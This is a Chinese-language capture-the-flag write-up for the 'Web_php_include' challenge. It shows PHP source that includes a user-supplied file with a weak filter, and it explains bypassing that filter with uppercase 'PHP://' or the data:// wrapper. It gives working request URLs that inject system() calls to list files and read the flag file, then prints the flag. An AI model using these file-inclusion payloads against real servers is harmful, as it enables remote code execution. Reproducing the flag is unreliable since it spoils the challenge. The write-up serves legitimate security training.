# Web_php_include

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=ce6391a6-7070-4410-9d33-5b23967e77f1_2)

这里介绍最简单的方法之一。其实还有很多相对复杂但很牛逼的方法，比如传木马，数据库写入什么的，但背后的关键点都在于php伪协议的使用。

```php
<?php
show_source(__FILE__);
echo $_GET['hello'];
$page=$_GET['page'];
while (strstr($page, "php://")) {
    $page=str_replace("php://", "", $page);
}
include($page);
?>
```

可以看到源代码会包含page参数传入的文件。文件名的过滤也很少，只过滤了php://，甚至连大写的都没过滤。

- ### strstr()
- > 搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE。
- > 语法：strstr(string,search,before_search)
- > string:必需。规定被搜索的字符串。
- > search:必需。规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。
- > before_serach:可选。一个默认值为 "false" 的布尔值。如果设置为 "true"，它将返回 search 参数第一次出现之前的字符串部分。

注意这个函数是大小写敏感的。这里可以用PHP://绕过，也可以考虑另外一个php伪协议：data://

- ### data://
- > 必要条件：开启allow_url_fopen和allow_url_include。
- > 作用：自PHP>=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。
- > 用法：data://text/plain,或data://text/plain;base64,
- > 注意：,必需，plain后传明文，base64后传base64加密后的密文。

那这样就很简单了。我们可以用data://来传一个php代码，其中调用system()来执行我们想要的任意命令。

- http://61.147.171.105:53084/?page=data://text/plain,%3C?php%20system(%22ls%22)?%3E
- > 输出：fl4gisisish3r3.php index.php phpinfo.php

输出中看到fl4gisisish3r3.php是我们的目标。

- http://61.147.171.105:53084/?page=data://text/plain,%3C?php%20system(%22cat%20fl4gisisish3r3.php%22)?%3E

要注意的是上面这串执行完成后并不能直接看到，要用开发者工具检查元素，flag在注释里。

- ### Flag
- > ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}